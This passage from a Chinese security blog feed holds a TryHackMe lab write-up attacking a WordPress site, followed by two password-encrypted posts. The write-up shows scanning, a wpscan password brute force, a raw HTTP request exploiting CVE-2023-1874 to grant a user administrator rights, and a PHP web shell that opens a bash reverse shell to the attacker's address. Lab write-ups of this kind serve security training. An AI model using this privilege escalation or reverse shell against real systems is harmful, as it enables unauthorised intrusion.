class="keyword">for</span> 6s</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 60</span><br><span class="line">80/tcp open  http    syn-ack ttl 60</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.16 seconds</span><br><span class="line">           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)</span><br></pre></td></tr></table></figure><p>dirsearch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm]</span><br><span class="line">└─$ dirsearch -u http://10.10.227.21/</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/Documents/thm/reports/http_10.10.227.21/__24-11-15_11-20-59.txt</span><br><span class="line"></span><br><span class="line">Target: http://10.10.227.21/</span><br><span class="line"></span><br><span class="line">[11:20:59] Starting: </span><br><span class="line">[11:21:14] 403 -  277B  - /.ht_wsr.txt                                      </span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccess.bak1                                   </span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccess.sample                                 </span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccess.orig</span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccess.save</span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccess_orig                                   </span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccess_extra</span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccess_sc</span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccessOLD</span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccessBAK</span><br><span class="line">[11:21:14] 403 -  277B  - /.htaccessOLD2                                    </span><br><span class="line">[11:21:14] 403 -  277B  - /.html                                            </span><br><span class="line">[11:21:14] 403 -  277B  - /.htm                                             </span><br><span class="line">[11:21:14] 403 -  277B  - /.htpasswd_test                                   </span><br><span class="line">[11:21:14] 403 -  277B  - /.htpasswds</span><br><span class="line">[11:21:14] 403 -  277B  - /.httr-oauth</span><br><span class="line">[11:21:18] 403 -  277B  - /.php                                             </span><br><span class="line">[11:22:49] 301 -  313B  - /manual  -&gt;  http://10.10.227.21/manual/          </span><br><span class="line">[11:22:49] 200 -  208B  - /manual/index.html                                </span><br><span class="line">[11:23:14] 403 -  277B  - /server-status/                                   </span><br><span class="line">[11:23:14] 403 -  277B  - /server-status</span><br><span class="line">[11:23:46] 200 -    2KB - /wordpress/wp-login.php                            </span><br><span class="line">[11:23:47] 200 -   14KB - /wordpress/</span><br></pre></td></tr></table></figure><p>发现有wordpress?</p><p><code>wpscan --url http://10.10.227.21/wordpress</code></p><p>用户名枚举<br><code>wpscan --url http://10.10.227.21/wordpress --enumerate u</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://10.10.227.21/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] bob</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用户名爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/breakmenu]</span><br><span class="line">└─$ wpscan --url http://10.10.227.21/wordpress -U username.txt -P /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Trying bob / tigger Time: 00:00:03 &lt;&gt; (24 / 14344392)  0.00%  ETrying bob / password1 Time: 00:00:03 &lt;&gt; (25 / 14344392)  0.00%[SUCCESS] - bob / soccer                                       </span><br><span class="line">Trying bob / soccer Time: 00:00:03 &lt;&gt; (29 / 14344422)  0.00%  ETrying bob / anthony Time: 00:00:03 &lt;&gt; (29 / 14344422)  0.00%  Trying bob / anthony Time: 00:00:03 &lt;&gt; (30 / 14344422)  0.00%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: bob, Password: soccer</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Fri Nov 15 11:50:38 2024</span><br><span class="line">[+] Requests Done: 201</span><br><span class="line">[+] Cached Requests: 7</span><br><span class="line">[+] Data Sent: 57.482 KB</span><br><span class="line">[+] Data Received: 478.876 KB</span><br><span class="line">[+] Memory used: 298.184 MB</span><br><span class="line">[+] Elapsed time: 00:00:27</span><br><span class="line">                                                               </span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241116005157.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116005157.png"></a></p><p>php</p><p>现在查看漏洞情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwentyfour</span><br><span class="line"> | Location: http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/</span><br><span class="line"> | Last Updated: 2024-07-16T00:00:00.000Z</span><br><span class="line"> | Readme: http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.2</span><br><span class="line"> | Style URL: http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/style.css</span><br><span class="line"> | Style Name: Twenty Twenty-Four</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentyfour/</span><br><span class="line"> | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://10.10.227.21/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: &#x27;Version: 1.0&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wp-data-access</span><br><span class="line"> | Location: http://10.10.227.21/wordpress/wp-content/plugins/wp-data-access/</span><br><span class="line"> | Last Updated: 2024-10-17T00:01:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 5.5.16</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 5.3.5 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://10.10.227.21/wordpress/wp-content/plugins/wp-data-access/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:10 &lt;============================================</span><br></pre></td></tr></table></figure><p>版本信息<br>WordPress version 6.4.3</p><h2 id="Bob到admin"><a href="#Bob到admin" class="headerlink" title="Bob到admin"></a>Bob到admin</h2><h3 id="CVE-2023-1874漏洞"><a href="#CVE-2023-1874漏洞" class="headerlink" title="CVE-2023-1874漏洞"></a>CVE-2023-1874漏洞</h3><p>增加字段 wpda_role[]&#x3D;administrator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wordpress/wp-admin/profile.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.10.227.21</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Referer: http://10.10.227.21/wordpress/wp-admin/profile.php</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">Origin: http://10.10.227.21</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Cookie: wordpress_acb53ed9bd9ffb9d3641ba5b6474a8cd=bob%7C1731862320%7CjmBQkub8cT9VHTtMl4atHbZISLdhsQ6s7X5Z7OXe9DW%7C6142fcc0d753857ba3d07e771cc893e1e4c6cd51c9a49f165f94273087512582; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_acb53ed9bd9ffb9d3641ba5b6474a8cd=bob%7C1731862320%7CjmBQkub8cT9VHTtMl4atHbZISLdhsQ6s7X5Z7OXe9DW%7C5319955523faa3dbf4b646dcee47744c231d7956c4bf85f5b56e2a14c01be0a5; wp-settings-time-2=1731690049; wp-settings-2=mfold%3Do</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_wpnonce=5c284f6a11&amp;_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fprofile.php&amp;from=profile&amp;checkuser_id=2&amp;color-nonce=685716284a&amp;admin_color=fresh&amp;admin_bar_front=1&amp;first_name=bob&amp;last_name=bob&amp;nickname=bob&amp;display_name=bob+bob&amp;email=bob%40localhost.com&amp;url=&amp;description=&amp;pass1=&amp;pass2=&amp;action=update&amp;user_id=2&amp;submit=Update+Profile&amp;wpda_role[]=administrator</span><br></pre></td></tr></table></figure><h2 id="admin权限"><a href="#admin权限" class="headerlink" title="admin权限"></a>admin权限</h2><p><a href="/../assets/img/Pasted%20image%2020241116010554.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116010554.png"></a></p><p>找到主题<br><a href="/../assets/img/Pasted%20image%2020241116010734.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116010734.png"></a><br>修改某个页面 然后进行反弹webshell?<br>文件上传？<br><a href="/../assets/img/Pasted%20image%2020241116011255.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116011255.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/breakmenu]</span><br><span class="line">└─$ cat shell.php</span><br><span class="line">&lt;?php</span><br><span class="line">eval(\&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.17.5.121/4443 0&gt;&amp;1&#x27;\&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OA利用工具</title>
      <link href="/2024/11/14/OA%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/11/14/OA%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="2800043e2a891d03535d1438204762c2034cdecb3535d14c1fa3fd74f9326772">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f2596b395c03f2540c925e59c8babcb0a90257a01f50238f3d6a4e1abbd32652af67ef77cca617737af71cbb4bca7fa00be2b22ec6718d167509fceceb571eff4559ee6fd0de22b2c78686a9e8ea6a24b01fdf9624c5f0965abc559e113642aec4885356a5525a9bae1ec32db14610f9a5a7fd54dd9f8ab9214b28401dc6c04ebdaaa62303ca6196d2301f022fddb4695609ebc4162a84577283f3643deee6b30f9aa3e2f0316036a2d07fd2f871a0874aaf241ac8f7d2620f377dc3fe2cf287f1641eaaa3c1123de06a6d41b9e9df57c8db6e02662ff9a3f2480fbe1bd17387563fe0d7e95e7d551ca4419ded4421825526fe01b3c29c7d387d4db58a57fe7e0be9055df0e7df8f854d7faac5e604219be0ed418aefcc26a922b67f2c57565a00e2229763bd94b3b7537b5035ba7ca4941f0c01d7f08cdb20a31f1b2c13f5dd05caa89c69c4d6827640da6545711df4673e19ce0636c5f6cc06226cf13955ae5abad9cd265ce308412c2ac8635990aaabd6920f7c38d056d3a016328ab03b082a4c4d7abf0fbbe520f163e13054c83b924a903177f30e06611c695f47595c26a46362375e8b67f675e07c9574fd46f700e90d885a76c51805c0c74270497c96b4c127c08dfe76594861c411690cf1591f81c8555959d11025a9931fb00efaea451c4ed697771f88cfed69ad3cd635192579245dd6b6686ce9de2f48de3c997b3b4989ad2f5816468cee4291c5ca08655fcecac17b9f151e6cfbbc1ff21576d09470f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>University</title>
      <link href="/2024/11/14/HackTheBox%20University/"/>
      <url>/2024/11/14/HackTheBox%20University/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="9822418d41266f5ead4a04669e2f1a4dc946f0e69e47d051097db0ce1177a979">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259686e6fc3261c47ce3bb093cbeb378c458134ef21268b850c64c28583ce30028dd63df5b9fab3a42c7a5e73281035114755a5c4bfcfe527079e76573c1acc67767dd410327ebbd9f24bd9e3cffb44e5a423801347c6b36310a4ec44b98062f1ac1dc07c0c72bcb15fbc27ee9d0af5e7929ee3b3d67f2cd299a00bf6fa2a065ff142326e74df3b415a2bef99fd7ad09b295daad332e46cae11a04cf17bbdce9872c996163e61cd3705ff54752a73f473d02de811f5c388e04403395b9403ee309e0cddb55c588dcdfcee2c455e0db07c315597d32cac78b4dd4d9f240095f93c786b762b1556e3bcf4f9e4f3dfafb6241e89ecc2c5bdfc67b09bd466ceacd2f95108122c1d29b8736642519f4bd86dd2c7ce64c2d223b810131b4db67880be81d604de56e4de3aa98647ac6884688c49ed0bbdc3e58feb5a66b11104823f379c081e453b3282ede7d12b1cef98e3b58c557b3a07464cff68af440d552af888f8dfdcf60fc0b091aa481b6f6fa4f5691d2a51323665ef30e3f4c3cf213b8409d1a027ff5c062a19efdb56681e33d810b6bb78e621546219f7379c1a936512bf0b69ea5a843578cb902b4992d03469b89234fe49d88a33f5d904320434fa7a7f2d62f826f1268b7b8e9eae9241135bccb75e9028ffdafeb628c7263807bd7b4187e905546c7d65185bb2e063af2e470cdd1a5942e271ad50b6616ebf3e6a563a4fb94609b82af614ec2555d95298281761a5ed52078271f1b4e89ff92bb30ef90fb77d1877244ad095f92a74793f2cdedfdd5e0b266b742a55d0dd93aec2102f011aa51caf4b0d05097b15eeb31f876e34fa12e488edb88e064dbae7b0e6bc222f4056e11f0fbd4e246b8cffec8646aff7bf54565db48ed6b9e025a2a4a91556a8bf2299d924f350f6df9fda1d3c89af9b83610c99d821548e26904519545fb211067038012e17d7ec234064ddf0af38e588fcdaed4afefb02540e1b74ca37f59a258c18f3325898ce03c2452f4f992eb1e02bb63c1db9c1c461b989d5c25767d748939f9226ba371e988d183bb5f493dc2955e917710e2b540af047c9f1bc72ac8c56dca624c757fc878e8e2f364c1a11189babbc4bc56a20f5a9066c36e0f42d5a0598cee843785a1345fabbe37e16249423b17bd62ca70add5c9a920fd2fffdeab316828e3b759e6dba44f1eb7c5a98662b480754f07f245749cb91b93668f8f4af943cb55fa40d8bc020bf799e85785ee45bc159972d4055b58fab1d1e991e16e15d74b5ae023b1ceecce49d9982a9662e80c142ab9f11d1b56a12cfc9dd2708e044b9455db20239ed08c8da1bcaa35c1a407729377844434aa6202e26c3975e542f4868b69121f43c6c2f1c367c02542aee0c65354c561f9bfce0cac9307940dd47854bbeed475305340acc8e209035155e958dfff6602c73fff8ddc39ee419bdfb044486db63fd781cc91bf21b29096d53bf4a4982db5c43c5b60c37ab92ec4dd9eacae406a496713777b3f3c9fdb9af3374bf2e68a1ce4a3971415a3ce15d7b120a7f13dfdad6ff183af5940e1b7b8ef3c83c0e07fbcb098c09ae0389635574a391cf3911f0d2d1dee4eecd65a0ec08893426847e2a7941bff0da0534d357d05ac1afbbaaee1de4883c1a52d2ce9194e56138fb1c768a72410e37451e19827c20f632ae6475aa11c9f318a083c08cc3b63a4734a340003d1ce1b40403e83e5cb2ef69a291a36b79ab96b421218cfef40d6f581dc5decdd7f20d9cffbd6d5a95b3f36e8bd2b7a7d06b1452a06d2a1695f579f363695fb7972438eee0c379b1da1d2c1c84aca49a8097af44a8c13e706dcf5b769cb2b783c523666f66fa7609f8f8bf3db82803606a533582132690a68c44971f7b6aa440efa7c3a7dde229e93f3865849e99cd540448a85962adb294b36cf6a17cffd14b20e865d79b4ba203aab3a96b0bf2ffe56df020eee7f2109262d42be861ee09750a53308bf12fa132693b16fb2fa848becd6b709c0edc5c9af97c27d45b35b8fe46a2caf80555ecf0e9866fe8dc825c09d2c0735de2f0322ca332f3eb00e8b7f81373591690c4b557607bfd4ef2e59a38185f8679fa215ce00928830a91ff9277a510508caee50103a4d2a6add8c62668dc4d5c83bb8dc17a2f36deaf6aefe0f10dbdf6055013c2e11edb6e69acddb9a308c0c83950cdc9992886deb2a18d4b3bc91a46929347dcad07acd38fcc8bc8aa529ad3e93267b90f55557ce03f1cc9e7cae494cd96a52ac1b77eae647267c9bce9c54a1b7bcc5758bc8e9a56f7af727213c68ca4dc489f60e00518b1307bbed38e4d487ca262f05797a5780b495a7cf24e9c0ee02cda39d43d6935d5eeab51e30c55851fc0e1c80f852fc9ee9d73e776a53b76050479b7d92b9b330aa30629156da8dd45301e17b8ae04d8b87057117197186adc5bee673f2cc675230607879830cb76aa34b54d6e5e9527a5780cc7c39c04dceef41cb6367ebc60523e94b99e4f81ba7dd9ba66038399590fc654b6990ab9ae7d521d2245327b407959ff284fe97a29cf81eb7db7b8b9f2e4847077ee1d11f2647c943c1e8ef62347c22fa6388e7832933c7af899f05fc4998199c9a5db56a44c00f39700ba43c7a7d1aa77fa0e67416ce73441608837a67a0b2f08d885ec61159014a0f6e9b899010a9f8c38e6d4fbd6360e3dad3073525278a2280dca1da951d1facd80afb2ecae23f1a108f38010b3615e50a5857cb04dacb8a223982a0bee0c9e57c41412977618eb7b012faab961cbb1626303699c5218edeceee34712ca1d5fcebb0d9c0d361490212c830d541e2963679cf7a1e2c966f44e9d9a075a46fd52c8e278508b5e1e1295c1a1bb1e083e5c06fd890f04f97c28415fd4b41cc10c016ca1768fe7211c1fcd563c329875c4a10200fccb22721a0e7947cb3541490896afeb0b08105c16e9b6b9353a718ff0e5103f09a2048871413adf9da75d0ebe5307f39a1d962101cbf056673fd5862b51609f207e1e03f358ceff09a45dfd7fc05d28201aec3718b6aff101b81e023b4666444b3b0a0a22ae22ab3e40f844d78fdbe354bf0f7dc07211016454e318903b2e2b88a0964fcac84745d5b3fae84c495cb05c3d96a054c82e49fc3a8d3ca7d54f9bfa14bfe65fab1e4d28bdac734e3570bb8637ad84b111d71a1a7e635f2bc95b606e01e7c3af21f3e38b99e6bba87c1d3c00b793630f0490a0250ecaceff66c3b4bf7ff436d4cdcaa1e753d67943046b84942d48592cde8b4127ca23c7a10d2438a0fb6a8b7df2076135ecf9fe9b8d059b8ad162f83378acf80c056c7c4d6114da8d702f357c63937e110bb73277a657af70962330101f3974c1b13cecb7b75f1261392a78d59ef0ddbc9e5abec6348280c011f18612682669b1e7ec2481eee49f2eef665b8cabbc312674f061d532792e2d15bdd71997c2176ee33ac3d3dcc096a0d194191ebdcf9b57cb6f35597cbeed6a19273be32ceb7c32ec08588b97edd1cd210535b04d0f8de3550d2e722c88d8c153ef4b4eee2786524f191cd7203f07067d4ae253893ff8a08a705f63c6b463facbe3b3ca2472c0a641ebf8f8b56265f92c785b770f9e31d8249933b4c76336321ebe810274fc4e91b74b0e0f1efd4825113d2d79a037a9042fd7e075fa21f50b61631db5c8efd1ccd246ec18e0392687d93447643b5e9cbb0ef18b297ad19ea69d45eaa4946511495bb8be3d2087433724005df83ed10faee05bf9edc261ecdb504cc9adc85498681c018953e653fd1272262b718221563693b9d9dc3154d4e49cbe91ea13da2b9c9ecea9f89eebb2eca0f7f928bbf43b14c9920cda9a2371b077adc8616e0c5d8080c1749efacd0ac1b65d42c8c2abe6204dc849477fedb8db9d84695d48de8cd396bb8f30753e52d86d60056e1e05fcae5d33821ba01dbfd6b104bc6a5d3d536df0853279baa764393cad364a4529c2f86f19753e957ffad5783de4c5dd4dc0e8d4c93b4ef12abb621486eee4f9ed3a465b94f8571bde4b769721a717af096521cb56a78555ab96e4a0a51bafafd143691a9897635134ae0985c3463a4b120346ecd576f4cb0d6ee728f588ad5f960b9a66a963d969673c0a540cd44f31e128356e6f6f41ad4a1158a3612ddba8c8e7e5a0897787e0010d08a586f431f72e29937c2249120dd688d615dcc7c3a031d1ed9b8d7c120f93b0e9ae05a016a11f565dd5f39b2aba4ec765e6b05533a791ca7a00a17b66029150e4d172ef728060c0f6df5e0361affb704c54a098a1fd6f9d41e452dbfaf0cbeea7f7c0437195ac7aabb1b03ad4888b4b1c374fd0ab8835c5f7ed33f44c3a8f31e5eb1ea899b456b62126e448a136e5f9346e971242d28bdd76588810db0fd4b10e4c4d2781a7cebde9162e586fc7dec901dcdef418bf8bfc95279ad8c36fe517ccdcb326c4314c545ebdd8609f54e56d62ac19e394604c37322be5933ad847116eec433bc3871ff0600d59e0a1ff7fec3cc3cdfa8b91886706c4eac3cef3e9183b7964f473498c5a3f1e89b2083049f9bc2f33621f0279b39e8ae69947529957e15b59c7e6bbdfe65fdf8e045145e811c444e50ef4a2d5589499193a3e0928ca7462e38ce9b8104fb70334f1d3dd15ace0c44ea30fd37b2893c5dca6f0d9a3e19a6beecce04a65c6e4a87753b3b60d5a651f7d35afa9b0de4d0767e735d4babb764e07d0cccc574992826b667d9718616c44b6d262587a6e1a168acf00080505730142a1accc6b5172a8882a722492130fe9b34a9ae906869a16fea529bfd2e0a0d7d9acc4cbf3b3e6e2ee3ec12ec2f27475b9b9fbeb17c3c7087a387be07c43ddb8d18cdf14e4cc14191d9ac4befa8f0f207236d92f4b89dae96534cd7c086e0dbb2fa78f99af024bae967d77be715f808f94e96b2586e173da7e706c4d6e6602009b68a284b93a18051fb6a4343556dc468a4951a36039df4bc8b7ad4baa514b2d771973b9097461616a804203d0539a5aba5958e9f9c0efc09c7c929749aad7dc139b086fc5210b46e2fb640af1e6f5f1aa6d3a8b44b936c675e9cc1e67c49c881fc123f4e0f0dd0e1c9fcdea58ab57a301c3ab24a1d3fe09bf6c6552ca2a8096d1a95f61320bc41ac859c03e281ce771c5ff312785e29ed2a34fa5671c1166270ec3859f50cbe54b07a342b8bc77d2f373683372019b121a65de47a8e127ddd028c5c54a8d8421a43be6b118cddacd6e2e93fff0a8b0a56c13cb311aefe30dc47a08f911cdcfdf41beddf87752ba3e2da078ed2f8a1d2588016fcc3ec35811615e85e53e014b4b36344857d7661067d8be22e5c7cddeae2c7247e78f7f3fa2aa0981189e4e2bb3ac372dfa1f1bb0422069942b002522c3fd344c178b2e1691319d468b97c4658e1b17697bf2e446dee99f78af83d7d16cb927a580834f4be669b8cea8e38b4cef12a9bf429963f3ac09637106b71be75116791299cc516a73bb9d7fc7c17f14a1b2be86d6a02983d8b65d67073176f245ed8382d89c5